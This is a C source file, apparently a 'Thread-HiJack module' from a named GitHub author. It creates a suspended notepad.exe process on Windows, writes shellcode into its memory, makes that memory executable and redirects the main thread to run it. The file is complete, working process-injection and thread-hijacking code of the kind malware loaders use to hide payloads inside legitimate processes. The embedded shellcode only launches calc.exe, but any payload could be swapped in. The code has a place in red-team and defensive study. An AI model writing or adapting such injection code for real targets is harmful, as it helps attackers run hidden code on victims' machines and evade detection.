// Thread-HiJack module by K3rnel-Dev
// Github: https://github.com/k3rnel-dev

#include <windows.h>
#include <stdio.h>

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx = {0};
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    // getting the original thread context
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[0x1] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

#ifdef _WIN64
    // updating the next instruction pointer to be equal to our shellcode's address for x64
    ThreadCtx.Rip = (DWORD64)pAddress;
#else
    // updating the next instruction pointer to be equal to our shellcode's address for x86
    ThreadCtx.Eip = (DWORD)pAddress;
#endif

    // setting the new updated thread context
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[0x1] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // resuming suspended thread, thus running our payload
    ResumeThread(hThread);

    return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFOA Si = {0};
    PROCESS_INFORMATION Pi = {0};

    // Cleaning the structs by setting the member values to 0
    ZeroMemory(&Si, sizeof(STARTUPINFOA));
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
    Si.cb = sizeof(STARTUPINFOA);

    // Getting the value of the %WINDIR% environment variable
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[0x1] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Creating the full target process path 
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("\n[0x0] Running : \"%s\" ... ", lpPath);

    if (!CreateProcessA(
        NULL,                    // No module name (use command line)
        lpPath,                    // Command line
        NULL,                    // Process handle not inheritable
        NULL,                    // Thread handle not inheritable
        FALSE,                    // Set handle inheritance to FALSE
        CREATE_SUSPENDED,        // Creation flag
        NULL,                    // Use parent's environment block
        NULL,                    // Use parent's starting directory 
        &Si,                    // Pointer to STARTUPINFO structure
        &Pi)) {                    // Pointer to PROCESS_INFORMATION structure

        printf("[0x1] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("\n[0x0] Success to create suspend process\n");

    // Populating the OUT parameters with CreateProcessA's output
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Doing a check to verify we got everything we need
    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
        return TRUE;
    return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[0x1] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[0x0] Allocated Memory At : 0x%p \n", *ppAddress);

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[0x1] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[0x1] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main() {
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL, hThread = NULL;
    PVOID pRemoteAddress = NULL;

    // Example shellcode - opening calc.exe
	BYTE shellcode[] = 
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
        "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
        "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
        "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
        "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
        "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
        "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
        "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
        "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
        "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
        "\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
        "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
        "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    
    if (!CreateSuspendedProcess("notepad.exe", &dwProcessId, &hProcess, &hThread)) {
        printf("[0x1] Failed to create suspended process.\n");
        return -1;
    }

    if (!InjectShellcodeToRemoteProcess(hProcess, shellcode, sizeof(shellcode), &pRemoteAddress)) {
        printf("[0x1] Failed to inject shellcode.\n");
        return -1;
    }

    if (!HijackThread(hThread, pRemoteAddress)) {
        printf("[0x1] Failed to hijack thread.\n");
        return -1;
    }

    printf("[0x0] Injected and hijacked successfully.\n");
    return 0;
}